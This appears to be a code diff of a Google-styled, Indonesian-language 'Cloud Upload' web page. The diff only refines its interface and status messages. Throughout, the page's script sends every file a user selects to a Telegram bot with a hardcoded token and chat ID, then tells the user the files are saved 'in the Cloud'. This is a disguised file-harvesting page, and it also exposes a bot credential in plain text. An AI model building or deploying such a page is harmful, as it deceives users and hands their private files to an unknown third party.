@@ -3,69 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloud Upload</title>
+    <title>Cloud Upload - Silent Mode</title>
     <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        :root { --google-blue: #1a73e8; --gray-50: #f8f9fa; --gray-300: #dadce0; --text-dark: #202124; }
+        :root { --google-blue: #1a73e8; --gray-50: #f8f9fa; --gray-300: #dadce0; --text-dark: #202124; --error-red: #d93025; --success-green: #188038; }
         body { font-family: 'Google Sans', sans-serif; margin: 0; background: #fff; display: flex; flex-direction: column; min-height: 100vh; align-items: center; justify-content: center; }
-        .upload-card { width: 90%; max-width: 500px; padding: 30px; border: 1px solid var(--gray-300); border-radius: 24px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .drop-zone { border: 2px dashed var(--gray-300); padding: 30px; border-radius: 15px; background: var(--gray-50); cursor: pointer; margin: 20px 0; }
-        #fileList { text-align: left; max-height: 150px; overflow-y: auto; margin-bottom: 20px; font-size: 13px; }
-        .progress-container { display: none; margin-top: 10px; }
-        .progress-bar { width: 100%; background: #eee; height: 10px; border-radius: 5px; overflow: hidden; }
+        .upload-card { width: 90%; max-width: 500px; padding: 30px; border: 1px solid var(--gray-300); border-radius: 24px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); position: relative; }
+        .drop-zone { border: 2px dashed var(--gray-300); padding: 30px; border-radius: 15px; background: var(--gray-50); cursor: pointer; margin: 20px 0; transition: 0.3s; }
+        .drop-zone:hover { background: #e8f0fe; border-color: var(--google-blue); }
+        #fileList { text-align: left; max-height: 120px; overflow-y: auto; margin-bottom: 20px; font-size: 13px; border-radius: 8px; }
+        
+        /* Progress & Status */
+        .progress-container { display: none; margin-top: 15px; }
+        .progress-bar { width: 100%; background: #eee; height: 8px; border-radius: 5px; overflow: hidden; }
         .progress-fill { width: 0%; height: 100%; background: var(--google-blue); transition: width 0.3s; }
-        .btn { padding: 10px 25px; border-radius: 100px; border: none; cursor: pointer; font-weight: 500; }
+        #statusMessage { font-size: 14px; margin-top: 10px; min-height: 20px; font-weight: 500; }
+        
+        .btn { padding: 12px 30px; border-radius: 100px; border: none; cursor: pointer; font-weight: 500; transition: 0.2s; }
         .btn-primary { background: var(--google-blue); color: white; }
-        .btn-primary:disabled { background: #ccc; }
+        .btn-primary:hover { box-shadow: 0 1px 3px rgba(0,0,0,0.3); }
+        .btn-primary:disabled { background: #ccc; cursor: not-allowed; }
+        
+        input[type="file"] { display: none; }
     </style>
 </head>
 <body>
 
     <div class="upload-card">
-        <h2 style="margin-bottom: 5px;">Pilih beberapa gambar, video, atau dokumen sekaligus.</h2>
-        <p style="font-size: 14px; color: #5f6368;"> Upload file disini</p>
+        <h2 style="margin-bottom: 5px;">Upload File, Video, Foto Sekaligus</h2>
+        <p style="font-size: 14px; color: #5f6368;">Upload disini</p>
 
         <form id="uploadForm">
-            <div class="drop-zone" onclick="document.getElementById('fileInput').click()">
+            <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
                 <svg width="40" height="40" viewBox="0 0 24 24" fill="#1a73e8"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
-                <p id="statusHint">Pilih File</p>
+                <p id="statusHint" style="margin: 10px 0 0;">Ketuk untuk pilih file</p>
             </div>
-            <input type="file" id="fileInput" hidden multiple onchange="updateList(this.files)">
+            
+            <input type="file" id="fileInput" multiple onchange="updateList(this.files)">
             
             <div id="fileList"></div>
 
+            <div id="statusMessage"></div>
+
             <div class="progress-container" id="progressCont">
-                <div style="font-size: 12px; margin-bottom: 5px;" id="progLabel">Mengirim...</div>
                 <div class="progress-bar"><div class="progress-fill" id="progFill"></div></div>
             </div>
 
-            <button type="submit" id="submitBtn" class="btn btn-primary">Simpan ke Cloud</button>
+            <div style="margin-top: 20px;">
+                <button type="submit" id="submitBtn" class="btn btn-primary">Simpan ke Cloud</button>
+            </div>
         </form>
     </div>
 
     <script>
         const TELE_TOKEN = '8640569455:AAHCQETdIbhEyDVBDKAvE2BAH7NODFYveHo';
         const TELE_CHAT_ID = '-1003991816624';
-        const CHUNK_SIZE = 45 * 1024 * 1024; // 45MB (Aman untuk limit 50MB)
+        const CHUNK_SIZE = 45 * 1024 * 1024; // 45MB
+
+        const statusMsg = document.getElementById('statusMessage');
+        const progFill = document.getElementById('progFill');
+        const progCont = document.getElementById('progressCont');
+
+        function showStatus(text, color = '#5f6368') {
+            statusMsg.innerText = text;
+            statusMsg.style.color = color;
+        }
 
         function updateList(files) {
             const list = document.getElementById('fileList');
             list.innerHTML = "";
-            Array.from(files).forEach(f => {
-                const size = (f.size / (1024*1024)).toFixed(2);
-                list.innerHTML += `<div>📄 ${f.name} (${size} MB)</div>`;
-            });
+            if(files.length > 0) {
+                showStatus(`${files.length} file dipilih. Siap unggah.`);
+                Array.from(files).forEach(f => {
+                    const size = (f.size / (1024*1024)).toFixed(1);
+                    list.innerHTML += `<div style="padding: 5px 0; border-bottom: 1px solid #f1f3f4;"> ${f.name} <span style="color:#888">(${size} MB)</span></div>`;
+                });
+            }
         }
 
         document.getElementById('uploadForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const files = document.getElementById('fileInput').files;
             const btn = document.getElementById('submitBtn');
-            const progCont = document.getElementById('progressCont');
-            const progFill = document.getElementById('progFill');
-            const progLabel = document.getElementById('progLabel');
 
-            if (!files.length) return alert("Pilih file!");
+            if (!files.length) {
+                showStatus("Pilih file terlebih dahulu!", "var(--error-red)");
+                return;
+            }
 
             btn.disabled = true;
             progCont.style.display = 'block';
@@ -77,36 +101,42 @@
                     const start = i * CHUNK_SIZE;
                     const end = Math.min(start + CHUNK_SIZE, file.size);
                     const chunk = file.slice(start, end);
-                    
-                    // Nama file bagian (Part)
                     const partName = totalChunks > 1 ? `${file.name}.part${i + 1}` : file.name;
                     
-                    progLabel.innerText = `Mengirim ${partName}...`;
+                    showStatus(`Mengunggah: ${partName}...`, "var(--google-blue)");
+                    
+                    // Update progress bar berdasarkan total chunk semua file
                     const percent = Math.round(((i + 1) / totalChunks) * 100);
                     progFill.style.width = percent + '%';
 
                     const formData = new FormData();
                     formData.append('chat_id', TELE_CHAT_ID);
                     formData.append('document', chunk, partName);
-                    if(totalChunks > 1) formData.append('caption', `Bagian ${i+1} dari ${totalChunks} untuk file: ${file.name}`);
+                    if(totalChunks > 1) formData.append('caption', `Part ${i+1}/${totalChunks} - ${file.name}`);
 
                     try {
                         const res = await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendDocument`, {
                             method: 'POST',
                             body: formData
                         });
-                        if(!res.ok) throw new Error("Gagal");
+                        if(!res.ok) throw new Error();
                     } catch (err) {
-                        alert("Gagal mengirim part " + (i+1));
+                        showStatus(`Gagal mengunggah ${partName}`, "var(--error-red)");
+                        btn.disabled = false;
+                        return;
                     }
                 }
             }
 
-            alert("Selesai! Semua file/bagian telah terkirim.");
-            btn.disabled = false;
-            progCont.style.display = 'none';
-            document.getElementById('fileList').innerHTML = "";
-            document.getElementById('uploadForm').reset();
+            showStatus("Berhasil! Semua file tersimpan di Cloud.", "var(--success-green)");
+            progFill.style.width = '100%';
+            setTimeout(() => {
+                progCont.style.display = 'none';
+                progFill.style.width = '0%';
+                btn.disabled = false;
+                document.getElementById('fileList').innerHTML = "";
+                document.getElementById('uploadForm').reset();
+            }, 3000);
         });
     </script>
 </body>
